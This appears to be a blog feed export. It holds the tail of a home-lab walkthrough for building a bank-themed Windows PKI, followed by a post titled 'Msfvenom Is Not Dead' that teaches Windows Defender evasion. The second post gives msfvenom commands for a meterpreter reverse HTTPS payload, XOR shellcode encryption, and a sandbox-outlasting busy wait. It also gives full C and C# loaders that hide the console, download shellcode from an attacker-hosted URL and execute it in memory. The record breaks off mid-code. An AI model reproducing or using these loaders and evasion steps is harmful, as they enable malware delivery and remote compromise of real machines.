<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*6GLM_2I3096No514xYlpWQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="publish-the-first-crl">Publish the First CRL</h4>

<p>Now that the configuration knows where to send people, we need to generate the “Blacklist” file (CRL) that contains these new instructions.</p>

<ul>
  <li>
    <p>In the console, expand <strong>Bank Root CA</strong>.</p>

    <ul>
      <li>
        <p>Right-click the folder <strong>Revoked Certificates</strong>.</p>
      </li>
      <li>
        <p>Select <strong>All Tasks</strong> &gt; <strong>Publish</strong>.</p>
      </li>
      <li>
        <p>Select <strong>New CRL</strong> &gt; <strong>OK</strong>.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*X7az0fbd1HDI8oYldTnwPQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*7bWm9Gk_7aQElmx2AKOOvA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Go to file explorer <code class="language-plaintext highlighter-rouge">C:\Windows\System32\CertSrv\CertEnroll</code>. You should see two files:</p>

<ol>
  <li>
    <p>A <code class="language-plaintext highlighter-rouge">.crl</code> file (The revocation list).</p>
  </li>
  <li>
    <p>A <code class="language-plaintext highlighter-rouge">.crt</code> file (The root certificate itself).</p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4D5ziHYMu0SnDsEaGl4K-A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now we have to transport those two files (.crt and .crl) from your isolated Root CA to the Domain Controller (DC01) so the rest of the network can trust them.</p>

<p>In a real bank, you would copy these to a rigorously scanned USB drive. In our lab, since the cable is still “plugged in” (virtually), we will use the network for a quick transfer before we sever the connection forever.</p>

<h4 id="transferring-files">Transferring Files</h4>

<p><strong>Prepare the Destination (On DC01)</strong></p>

<ul>
  <li>
    <p>Switch to your <strong>DC01</strong> virtual machine.</p>
  </li>
  <li>
    <p>Log in as <strong><code class="language-plaintext highlighter-rouge">BANK\Administrator</code></strong>.</p>
  </li>
  <li>
    <p>Open <strong>File Explorer</strong> and go to <strong>This PC</strong> &gt; <strong>Local Disk (C:)</strong>.</p>
  </li>
  <li>
    <p>Right-click in the empty space &gt; <strong>New</strong> &gt; <strong>Folder</strong>.</p>
  </li>
  <li>
    <p>Name it: <strong><code class="language-plaintext highlighter-rouge">PKI</code></strong>.</p>

    <ul>
      <li><em>(This will be our staging folder for all certificate files).</em></li>
    </ul>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9fOzKp1SEVgKLNoHZGeJiQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>Copy the Files (From ROOTCA01)</strong></p>

<ul>
  <li>
    <p>Switch back to <strong>ROOTCA01</strong>.</p>
  </li>
  <li>
    <p>Make sure you are looking at the folder with the 2 files (<code class="language-plaintext highlighter-rouge">C:\Windows\System32\CertSrv\CertEnroll</code>).</p>
  </li>
  <li>
    <p>In the file explorer address bar at the top, type this path and press <strong>Enter</strong>: <code class="language-plaintext highlighter-rouge">\\192.168.10.10\c$</code></p>

    <ul>
      <li><em>(This tells the Root CA to talk to the DC’s C: drive).</em></li>
    </ul>
  </li>
  <li>
    <p><strong>Authentication:</strong> It will ask for a username/password.</p>

    <ul>
      <li>
        <p>Username: <strong><code class="language-plaintext highlighter-rouge">BANK\Administrator</code></strong></p>
      </li>
      <li>
        <p>Password: <strong><code class="language-plaintext highlighter-rouge">BankLab1!</code></strong></p>
      </li>
    </ul>
  </li>
  <li>
    <p>Open the <strong><code class="language-plaintext highlighter-rouge">PKI</code></strong> folder you just created.</p>
  </li>
  <li>
    <p><strong>Copy/Paste:</strong> Drag and drop the <code class="language-plaintext highlighter-rouge">.crt</code> (Certificate) and <code class="language-plaintext highlighter-rouge">.crl</code> (Revocation List) files from the ROOTCA01 folder into this PKI folder.</p>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eaoQ0DEDcRhZkyX8eIZQPQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="go-offline-the-air-gap">Go Offline (The “Air Gap”)</h4>

<p>Now that the files are safely on the Domain Controller, ROOTCA01 has finished its job for now.</p>

<p>It’s time to simulate the security procedure of taking it offline.</p>

<ul>
  <li>
    <p>On <strong>ROOTCA01</strong>, close all windows.</p>

    <ul>
      <li>
        <p>Click <strong>Start</strong> &gt; <strong>Power</strong> &gt; <strong>Shut Down</strong>.</p>
      </li>
      <li>
        <p>Select <strong>Other (Planned)</strong> and click <strong>Continue</strong>.</p>
      </li>
    </ul>
  </li>
</ul>

<p>The Root CA is now <code class="language-plaintext highlighter-rouge">Offline.</code> It will remain powered down and disconnected from the network until it is specifically needed to sign the Subordinate CA’s certificate request. This ensures that the master private keys are physically inaccessible to online attackers.</p>

<h4 id="trust-test">Trust Test</h4>

<p>We are going to verify if your server trusts the certificate yet.</p>

<p>**1. The “Before” Check **</p>

<ul>
  <li>
    <p>Go to your folder <code class="language-plaintext highlighter-rouge">C:\PKI</code>.</p>
  </li>
  <li>
    <p>Double-click on <strong><code class="language-plaintext highlighter-rouge">Bank Root CA.crt</code></strong>.</p>
  </li>
  <li>
    <p>Look at the <strong>General</strong> tab.</p>
  </li>
  <li>
    <p>You will likely see a <strong>Red Cross</strong> and a message saying:</p>

    <blockquote>
      <p><em>“This CA Root certificate is not trusted. To enable trust, install this certificate in the Trusted Root Certification Authorities store.”</em></p>
    </blockquote>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*-q8uA95fRIe8XZAebSfxVQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="publish-the-trust-to-active-directory">Publish the Trust to Active Directory</h4>

<p>Perform these steps on DC01 (logged in as BANK\Administrator).</p>

<p><strong>1. Open PowerShell (Admin)</strong></p>

<ul>
  <li>Right-click <strong>Start</strong> &gt; <strong>Windows PowerShell (Admin)</strong>.</li>
</ul>

<p><strong>2. Navigate to your PKI folder</strong> Type this command and press <strong>Enter</strong>:</p>

<div class="code-block-container">
  <span class="code-lang-tag">javascript</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
cd C:\PKI
</code></pre>
</div>

<p><strong>3. Check the filenames</strong> Type <code class="language-plaintext highlighter-rouge">ls</code> or <code class="language-plaintext highlighter-rouge">dir</code> to see exactly what your files are named. They are likely something like <code class="language-plaintext highlighter-rouge">Bank Root CA.crt</code> and <code class="language-plaintext highlighter-rouge">Bank Root CA.crl</code>. <em>(If they are named differently, update the commands below to match exactly).</em></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*koMeGQBckk41nB_QygbKUg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>4. Publish the Root Certificate</strong> we have to manually tell Active Directory which server this belongs to. We do this by adding the Server Name (ROOTCA01) to the end of the command.</p>

<div class="code-block-container">
  <span class="code-lang-tag">javascript</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
certutil -dspublish -f "Bank Root CA.crl" ROOTCA01
</code></pre>
</div>

<blockquote>
  <p>Note the ROOTCA01 at the end. This tells AD: “Put this in the container for the server named ROOTCA01”.)</p>
</blockquote>

<h4 id="publish-the-root-certificate">Publish the Root Certificate</h4>

<div class="code-block-container">
  <span class="code-lang-tag">javascript</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
certutil -dspublish -f "ROOTCA01_Bank Root CA.crt" RootCA
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*nxuY-1WGIU_wmeutWXoT-A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="install-the-web-server-iis">Install the Web Server (IIS)</h4>

<p>Now we need to turn DC01 into a web server so it can host the files for the URLs we configured (http://pki.bank.lab/…).</p>

<div class="code-block-container">
  <span class="code-lang-tag">javascript</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
Install-WindowsFeature Web-Server -IncludeManagementTools
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*5l8KjVE4vUEwrVh4Yr1loQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>It might take a minute.</p>

<h4 id="create-the-certenroll-folder">Create the “CertEnroll” Folder</h4>

<p>Once IIS is installed, we need to create the specific folder where the certificates will live and copy your files into it.</p>

<div class="code-block-container">
  <span class="code-lang-tag">javascript</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
New-Item -ItemType Directory -Path "C:\inetpub\wwwroot\CertEnroll"
</code></pre>
</div>

<p>Copy the files</p>

<div class="code-block-container">
  <span class="code-lang-tag">javascript</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
Copy-Item -Path "C:\PKI\*.*" -Destination "C:\inetpub\wwwroot\CertEnroll"
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dZoDG5HNEO8Ls-KBcO1dTQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="create-the-dns-record-on-dc01">Create the DNS Record (On DC01)</h4>

<ul>
  <li>
    <p>Open <strong>Server Manager</strong>.</p>

    <ul>
      <li>
        <p>Click <strong>Tools</strong> &gt; <strong>DNS</strong>.</p>
      </li>
      <li>
        <p>Expand <strong>DC01</strong> &gt; <strong>Forward Lookup Zones</strong>.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*iYVgYXG22hg7VYwrYKdjhg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

    <ul>
      <li>
        <p>Click on the folder <strong><code class="language-plaintext highlighter-rouge">bank.lab</code></strong>.</p>
      </li>
      <li>
        <p>Right-click in the empty white space on the right &gt; <strong>New Host (A or AAAA)…</strong></p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*skCKKfLi3l9R41GGk1ZVMA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

    <ul>
      <li>
        <p><strong>Name:</strong> Type <code class="language-plaintext highlighter-rouge">pki</code>.</p>
      </li>
      <li>
        <p><em>(Notice the “Fully qualified domain name” box automatically fills in <code class="language-plaintext highlighter-rouge">pki.bank.lab</code>).</em></p>

        <ul>
          <li><strong>IP address:</strong> Type <code class="language-plaintext highlighter-rouge">192.168.10.10</code>.</li>
        </ul>
      </li>
      <li>
        <p>Click <strong>Add Host</strong>.</p>
      </li>
    </ul>

    <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*zRoJRo2PT8NB_UN3-0stLg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

    <ul>
      <li>
        <p><em>You should see a message: “The host record pki.bank.lab was successfully created.”</em></p>

        <ul>
          <li>Click <strong>OK</strong> and then <strong>Done</strong>.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p>Now that DNS works and AD is updated, let’s see if your Domain Controller finally trusts the Root CA.</p>

<p><strong>Force Update:</strong> Open PowerShell and run:</p>

<div class="code-block-container">
  <span class="code-lang-tag">javascript</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
gpupdate /force
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*A2Y0AQVtCSGqtSggBjhgrA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>Check the Certificate:</strong></p>

<ul>
  <li>
    <p>Go to <code class="language-plaintext highlighter-rouge">C:\PKI</code>.</p>
  </li>
  <li>
    <p>Open <strong><code class="language-plaintext highlighter-rouge">ROOTCA01_Bank Root CA.crt</code></strong>.</p>
  </li>
  <li>
    <p><strong>Look at the General Tab.</strong></p>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*egx6rOhD5HHyMlQcjUc0vw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="final-verification">(Final Verification)</h4>

<p>Go to http://pki.bank.lab/ to check if I am valid. Let’s make sure that link actually works.</p>

<p>On DC01, open the Microsoft Edge browser.</p>

<p>The Result:</p>

<blockquote>
  <p>If it downloads a file (or asks to save the ‘Bank Root CA.crl’ file), we are all set.</p>
</blockquote>

<p>This proves that DNS resolved pki.bank.lab -&gt; IIS received the request -&gt; and served the file correctly.</p>

<p>that successful download actually proves:</p>

<ul>
  <li>
    <p><strong>DNS is working:</strong> Your computer asked for <code class="language-plaintext highlighter-rouge">pki</code> and found the Domain Controller.</p>

    <ul>
      <li>
        <p><strong>IIS is working:</strong> The web server received the request and knew exactly where the file was.</p>
      </li>
      <li>
        <p><strong>Permissions are correct:</strong> The server allowed you to take the file.</p>
      </li>
    </ul>
  </li>
</ul>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ngbsLyT5lwk6JDn0p7xlZw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h3 id="whats-next-part-2">What’s Next: Part 2</h3>

<p>With the “Trust Anchor” (Root CA) firmly established and secured offline, the foundation is laid. However, a Root CA should never issue certificates directly to end-users.</p>

<p>In <strong>Part 2</strong>, I will build the operational layer of this infrastructure: the <strong>Enterprise Subordinate CA (<code class="language-plaintext highlighter-rouge">SUBCA01</code>)</strong>.</p>

<ul>
  <li>
    <p><strong>Domain Integration:</strong> Unlike the Root, this server will join the <code class="language-plaintext highlighter-rouge">bank.lab</code> domain.</p>
  </li>
  <li>
    <p><strong>The Signing Ceremony:</strong> I will bring the Root CA back online temporarily to sign the Subordinate’s certificate request.</p>
  </li>
  <li>
    <p><strong>Issuance:</strong> We will configure this new server to automatically issue certificates to users and computers.</p>
  </li>
</ul>

<p>Stay tuned as we turn this “Chain of Trust” into a fully functional banking security service.</p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="walkthrough" /><summary type="html"><![CDATA[<p>For my latest home lab project, I am building a Two-Tier Public Key Infrastructure (PKI) to simulate a high-security banking environment.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*JXgOF-w_gIDA7L2EAXP7iw.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*JXgOF-w_gIDA7L2EAXP7iw.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Msfvenom Is Not Dead</title><link href="/blog/AV-Evations" rel="alternate" type="text/html" title="Msfvenom Is Not Dead" /><published>2026-01-30T00:00:00-05:00</published><updated>2026-01-30T00:00:00-05:00</updated><id>http://localhost:4000/blog/AV-Ev</id><content type="html" xml:base="/blog/AV-Evations"><![CDATA[<p>You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.</p>

<p>So I was thinking about a different way to keep using msfvenom these days, and I found one. Today, I’m going to show you that the tool isn’t the problem the delivery method is. By taking a ‘flagged’ raw payload and wrapping it in a custom C loader with simple XOR encryption, we can bypass static analysis and pop a calculator on a fully patched system.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*RgqwqTZWMz-OIvnxD_HA2w.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now let’s create our own <code class="language-plaintext highlighter-rouge">loader.c</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DRKqSVzYxjPm5mrcRVF0CA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Unfortunately, antivirus vendors know it better than anyone.</p>

<p>When you compile this C code into an <code class="language-plaintext highlighter-rouge">.exe</code>, the compiler effectively copies and pastes your <code class="language-plaintext highlighter-rouge">char stager[]</code> directly into the <code class="language-plaintext highlighter-rouge">.data</code> section of the executable.</p>

<ul>
  <li>
    <p>The Antivirus scans your new <code class="language-plaintext highlighter-rouge">.exe</code> file. It ignores the C syntax (<code class="language-plaintext highlighter-rouge">int main</code>, <code class="language-plaintext highlighter-rouge">VirtualProtect</code>) and looks at the raw bytes.</p>
  </li>
  <li>
    <p>It finds the exact sequence <code class="language-plaintext highlighter-rouge">\xfc\xe8\x82...</code> sitting inside your executable. Since it already flagged that sequence earlier, it flags your new program immediately. You haven’t changed the “fingerprint” — you just put it in a different container.</p>
  </li>
</ul>

<p>See the example below:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*F_Y5WUkq5y7Ngntl2GId5w.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h2 id="video-demonstration">Video Demonstration</h2>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/zymYUL9V4ec" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

<h3 id="the-solution-xor-encryption">The Solution: XOR Encryption</h3>
<p>To evade the Static Analysis (Signature) detection, you must make sure the shellcode inside your C file does not look like shellcode until the moment it runs.</p>

<p>We do this by encrypting the shellcode. A simple and effective method for learning is XOR Encryption.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*oeo6dTqaUMnBW_VK6jwKnA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Let’s update our loader too</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eGox0WO7kXyBLakfXUBUAQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*O65xRfbsH3G0Om1PRUyqTQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Do you think this simple XOR encryption would bypass Windows Defender?</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/u-PdD4gxbas" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

<h3 id="why-did-it-get-caught">Why did it get caught?</h3>

<p>Modern AVs don’t just read the file they <strong>run it</strong> in a fake, safe environment (a sandbox) for a few seconds to see what happens.</p>

<ol>
  <li>
    <p>When you downloaded/ran your executable, the AV secretly started it in a sandbox.</p>
  </li>
  <li>
    <p>The AV watched your program run the <code class="language-plaintext highlighter-rouge">for</code> loop. It saw the “gibberish” turn back into the dangerous <code class="language-plaintext highlighter-rouge">\xfc\xe8...</code> shellcode.</p>
  </li>
  <li>
    <p>Once the loop finished, the AV scanned the memory, saw the <code class="language-plaintext highlighter-rouge">Meterpreter</code> signature again, and deleted the file.</p>
  </li>
</ol>

<p><a href="https://learn.microsoft.com/en-us/defender-endpoint/adv-tech-of-mdav">Advanced technologies in Microsoft Defender Antivirus</a></p>

<h3 id="how-to-bypass-the-sandbox">How to Bypass the Sandbox</h3>

<p>The AV sandbox has a weakness <code class="language-plaintext highlighter-rouge">time</code>. It cannot analyze every file for 10 minutes it usually gives up after 5–10 seconds to avoid slowing down the user’s computer.</p>

<p>If we can make our program “do nothing” or “waste time” for longer than the AV is willing to watch, the AV will assume the file is safe, quit the sandbox, and let the real program run.</p>

<p>We will add a delay before the decryption happens. <strong>However, standard <code class="language-plaintext highlighter-rouge">Sleep()</code> often doesn’t work</strong> because AVs know how to “fast forward” through a simple sleep command.</p>

<p>Instead, we use a ‘busy wait,’ making the computer do some math that actually takes time to compute.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Yfo3x6fyxQUz298X9lWjZQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Do you think this time would bypass Windows Defender?</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/aRQJn9B5X14" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

<p>This successfully performed a sandbox bypass.</p>

<h1 id="reverse-shell">Reverse Shell</h1>

<p>Now, let’s get to the real deal: getting a reverse shell, not just popping up a calculator. This time, we will not use encryption.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*vZGONyKEOQJlA_ApeQKuLw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h4 id="step-1-generate-the-staged-payload">Step 1: Generate the Staged Payload</h4>

<p>Let’s generate the raw C code for a staged payload.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
msfvenom -p windows/meterpreter_reverse_https LHOST=IP LPORT=8443 -f raw &gt; shellcode.bin

</code></pre>
  
</div>

<h4 id="step-2">Step 2:</h4>

<div class="code-block-container">
  <span class="code-lang-tag">C</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
#include &lt;windows.h&gt;
#include &lt;wininet.h&gt;
#include &lt;stdio.h&gt;

#pragma comment (lib, "Wininet.lib")

int main() {

    // 1. Hide Console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 2. Setup Connection
    HINTERNET hInternet = InternetOpen(
        "Mozilla/5.0",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );

    HINTERNET hConnect = InternetConnect(
        hInternet,
        "IP-Addr",
        80,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0
    );

    // Flags to prevent caching
    DWORD flags = INTERNET_FLAG_RELOAD |
                  INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_PRAGMA_NOCACHE;

    HINTERNET hRequest = HttpOpenRequest(
        hConnect,
        "GET",
        "/shellcode.bin",
        NULL,
        NULL,
        NULL,
        flags,
        0
    );

    // Send request
    if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        return 0;
    }

    // 3. Allocate Memory
    char* buffer = (char*)VirtualAlloc(
        NULL,
        4194304, // 4 MB
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    // 4. Read Response
    DWORD bytesRead;
    if (InternetReadFile(hRequest, buffer, 4194304, &amp;bytesRead)) {
        if (bytesRead &gt; 0) {
            // 5. Execute shellcode
            int (*shellcode)() = (int(*)())buffer;
            shellcode();
        }
    }

    // Cleanup
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}

</code></pre>
  
</div>

<h4 id="or">OR</h4>

<div class="code-block-container">
  <span class="code-lang-tag">C</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
# using System;
# using System.Net;
# using System.Runtime.InteropServices;

public class Program {
    // Change this to your IP address where you are hosting the file
    private static string URL = "http://IP:8000/shellcode.bin"; 

    // WINAPI IMPORTS
    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_READWRITE = 0x04; 
    private static UInt32 PAGE_EXECUTE_READ = 0x20;

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void Main()
    {
        // 1. Download the Shellcode
        byte[] shellcode = null;
        try 
        {
            Console.WriteLine($"[*] Contacting {URL}...");
            
            // WebClient is simple and effective for fetching raw bytes
            using (WebClient client = new WebClient())
            {
                // mimic a real browser user-agent to avoid basic blocks
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                
                // DownloadData returns a byte[] directly
                shellcode = client.DownloadData(URL);
            }

